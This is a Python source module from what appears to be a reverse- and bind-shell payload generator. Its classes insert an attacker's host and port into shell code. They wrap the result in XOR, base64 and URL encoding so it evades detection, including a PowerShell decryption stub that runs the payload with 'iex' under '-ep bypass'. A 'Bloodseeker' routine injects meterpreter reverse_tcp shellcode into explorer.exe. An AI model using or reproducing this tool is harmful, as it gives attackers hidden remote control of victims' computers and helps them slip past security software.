from encoders import powershell_base64, xor, to_unicode, to_urlencode
from binascii import hexlify
from binary import shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
from sys import exit
import platform
import os
import string

def generate_file_name(extension=""):
    file_name = ""
    while len(file_name) < 8:
        random_char = os.urandom(1)
        if random_char in string.letters:
            file_name += random_char
    return file_name + extension

class OperationalSystem(object):
    def __init__(self):
        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"

SysOS = OperationalSystem()

# These functions are widely used across the source-code.
def info(msg):
    if SysOS.OS == "linux":
        msg = "[\033[094m+\033[0m] {0}".format(msg)
    else:
        msg = "[+] {0}".format(msg)
    return msg

def error(msg):
    if SysOS.OS == "linux":
        msg = "[\033[091m!\033[0m] {0}".format(msg)
    else:
        msg = "[!] {0}".format(msg)
    return msg

def alert(msg):
    if SysOS.OS == "linux":
        msg = "[\033[093mALERT\033[0m] {0}".format(msg)
    else:
        msg = "[ALERT] {0}".format(msg)
    return msg
#=================

def xor_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if "powershell" not in name.lower():
        if "windows" not in name.lower():
            code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
            code = shell + " -c '" + code + "'"
    else:
        # Improved code in 0.3.6
        if "-Command" in code:
            prefix, xcode = code.split("-Command")
        else:
            prefix = "poweshell.exe -nop -ep bypass "
            xcode = code
        pcode = xcode.replace("'", "")
        pcode = pcode.replace("\\", "")
        
        code = to_unicode(pcode) # String to Unicode
        code = xor(code, args.xor) # XOR encode using random key <--
        code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
        code = """$k={0};$b=\\"{1}\\";$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
        code= prefix + "-Command " + "'%s'" % code
    return code

def base64_wrapper(name, code, args,shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if args.base64 is True:
        if "powershell" not in name.lower(): # post-note: linux powershell is going to have problem.
            if "windows" not in name.lower():
                code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
        else:
            # Powershell encoding code
            # Improved code in 0.3.6
            if "-Command" in code:
                prefix, xcode = code.split("-Command")
            else:
                prefix = "powershell.exe -nop -ep bypass "
                xcode = code
            
            pcode = xcode.replace("'", "") # Remove single quotes from -Command
            pcode = pcode.replace("\\", "") # remove string quotation
            code = prefix + "-Encoded " + powershell_base64(pcode)
    return code


class Shell(object):
    def __init__(self, name, short_name, shell_type, proto, code, system=None, arch=None, use_handler=None, use_http_stager=None):
        """
        ShellCode object is responsible for holding information about
        the static characteristics and informations about this shell 
        entry.
        It does not is reponsible for generating code or applying en-
        encoders. This is done by ReverseShell() or BindShell() clas-
        ses.
        """

        # These are the required attributes;
        self.name = name
        self.type = shell_type
        self.proto = proto
        self.code = code
        self.short_name = short_name if len(short_name) > 0 else "generic"

        # These are optional attributes;
        self.system_os = "unknown" if system is None else system
        self.arch = "Unknown" if arch is None else arch
        self.handler = None if use_handler is None else use_handler # this is going to be the handler function.
        self.handler_args = None # this is going to be set during execution.

        self.use_http_stager = False if use_http_stager is None else use_http_stager
        return
    
    def get_full_name(self):
        return self.system_os + "/" + self.type + "/" + self.proto + "/" + self.short_name
    
    
class ReverseShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.host = args.host
        self.port = args.port
        self.code = code
        self.payload = str() # this is where the final code is stored.

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        # Update of 0.3.6
        # Some custom shells will not need TARGET and PORT strings.
        # To deal with that, I will just try to find them in the string first.
        if "TARGET" in self.code and "PORT" in self.code:
            self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
        else:
            # Custom shell. Here we need to program individually based in specifics.
            if "bloodseeker" in self.name.lower(): # This is for Bloodseeker project.
                
                # This one requires a stager.
                if self.args.stager is None:
                    print(error("This payload REQUIRES --stager flag."))
                    exit(1)
                
                print(info("Generating shellcode ..."))
                malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
                self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
                print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
                print(alert("It is recommended to use the --base64 flag."))
                return self.code # we dont need encoder in this one.
            else:
                print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                exit(1)

        
        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True and self.args.stager is None:
            self.code = to_urlencode(self.code)
        
        return self.code

class BindShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.port = args.port
        self.code = code
        self.payload = str() # this is where the final code is stored.

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.code = self.code.replace("PORT", str(self.port))

        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply url-encoding
        if self.args.urlencode is True:
            self.code = to_urlencode(self.code)
        
        return self.code
